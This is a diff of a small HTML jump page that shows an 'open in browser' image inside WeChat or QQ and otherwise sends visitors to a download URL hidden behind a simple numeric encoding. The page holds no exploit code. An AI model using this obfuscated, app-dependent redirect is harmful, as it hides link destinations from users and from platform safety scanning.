@@ -1,23 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<title></title>
+    <title></title>
     <meta charset="utf8">
 </head>
-<body>
-<img id="img" src="tip.png" style="display:none;width:100%;height:100%;padding:0px 0px;margin:0px 0px;">
+<body style="margin:0;">
+<img id="img" src="tip.png" style="display:none;width:100%;height:100%;padding:0px 0px;">
 
 <script>
-	function is_mobileQQ() {
-		var ua = navigator.userAgent.toLowerCase();
+    function F_encode(text, key) {
+        num_out = "";
+        str_in = escape(text);
+        for (i = 0; i < str_in.length; i++) {
+            num_out += str_in.charCodeAt(i) - key;
+        }
+        return num_out;
+    }
 
-		if (ua.indexOf('qq') !== -1) {
-			return true;
-		} else {
-			return false;
-		}
-	}
-	function is_weixin() {
+    function F_decode(num, key) {
+        text_out = "";
+        for (i = 0; i < num.length; i+=2) {
+            var cha = num.substr(i, 2);
+            text_out += unescape(String.fromCharCode(parseInt(num.substr(i, 2)) + key));
+        }
+        return text_out;
+    }
+
+    function is_mobileQQ() {
+        var ua = navigator.userAgent.toLowerCase();
+
+        if (ua.indexOf('qq') !== -1) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    function is_weixin() {
 
         var ua = navigator.userAgent.toLowerCase();
         if (ua.match(/MicroMessenger/i) == "micromessenger") {
@@ -26,14 +45,10 @@
             return false;
         }
     }
-            // alert(navigator.userAgent.toLowerCase());
-
-    if (is_weixin()==true || is_mobileQQ()==true){
-    	document.getElementById('img').style.display = 'block';
+     if (is_weixin()==true || is_mobileQQ()==true){
+        document.getElementById('img').style.display = 'block';
     }else{
-        alert('QQ');
-        alert(navigator.userAgent.toLowerCase());
-    	window.location.href = '';
+        window.location.href = 'http://' + F_decode('26232323232429217486842275869485838672752275888974872280857576957075888974872179918483', 25);
     }
 </script>
 </body>
